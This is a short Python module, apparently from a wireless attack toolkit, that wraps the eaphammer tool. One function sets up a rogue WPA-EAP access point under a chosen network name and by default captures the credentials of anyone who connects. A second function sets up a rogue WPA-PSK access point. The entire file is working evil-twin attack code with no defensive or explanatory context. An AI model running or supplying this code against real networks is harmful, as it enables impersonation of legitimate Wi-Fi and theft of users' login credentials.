from typing import List, Optional

from ..utils import ToolError, run_quiet, which


def hostile_portal(iface: str, essid: str, channel: int = 6,
                   capture_creds: bool = True,
                   extra: Optional[List[str]] = None) -> None:
    if which("eaphammer") is None:
        raise ToolError("eaphammer not installed (git clone https://github.com/s0lst1c3/eaphammer)")
    cmd = [
        "eaphammer", "-i", iface,
        "--channel", str(channel),
        "--auth", "wpa-eap",
        "--essid", essid,
    ]
    if capture_creds:
        cmd += ["--creds"]
    if extra:
        cmd.extend(extra)
    run_quiet(cmd)


def wpa_psk(iface: str, essid: str, psk: str, channel: int = 6) -> None:
    if which("eaphammer") is None:
        raise ToolError("eaphammer not installed")
    run_quiet([
        "eaphammer", "-i", iface,
        "--channel", str(channel),
        "--auth", "wpa-psk",
        "--essid", essid,
        "--psk", psk,
    ])
